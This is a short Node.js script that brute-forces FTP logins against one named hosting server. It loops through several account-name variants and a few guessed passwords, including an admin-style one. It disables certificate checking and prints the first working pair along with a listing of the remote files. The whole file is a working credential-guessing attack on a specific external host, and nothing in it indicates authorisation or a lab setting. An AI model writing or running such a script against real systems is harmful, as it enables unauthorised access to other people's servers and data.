const ftp = require("basic-ftp")

const users = [
    "tspmasterprd",
    "a2a3b9-001",
    "a2a3b9",
    "a2a3b9_tspmasterprd",
    "db_a2a3b9_tspmasterprd",
    "WIN8236\\tspmasterprd",
    "WIN8236\\a2a3b9-001",
]

const passwords = [
    "tspmasterprd",
    "@dm1n1str@t0r",
    "a2a3b9_tspmasterprd",
]

async function testAll() {
    for (const u of users) {
        for (const p of passwords) {
            const client = new ftp.Client()
            client.ftp.verbose = false
            try {
                console.log(`Testing user='${u}', pass='${p}'...`)
                await client.access({
                    host: "WIN8236.site4now.net",
                    user: u,
                    password: p,
                    secure: true,
                    secureOptions: { rejectUnauthorized: false }
                })
                console.log(`========================================`)
                console.log(`SUCCESS! Working combo: user='${u}', pass='${p}'`)
                console.log(`========================================`)
                const list = await client.list()
                console.log("Remote listing:", list.map(f => f.name))
                client.close()
                return { user: u, pass: p }
            } catch (err) {
                // Ignore failure and continue
            } finally {
                client.close()
            }
        }
    }
    console.log("None of the standard combinations worked.")
    return null
}

testAll()
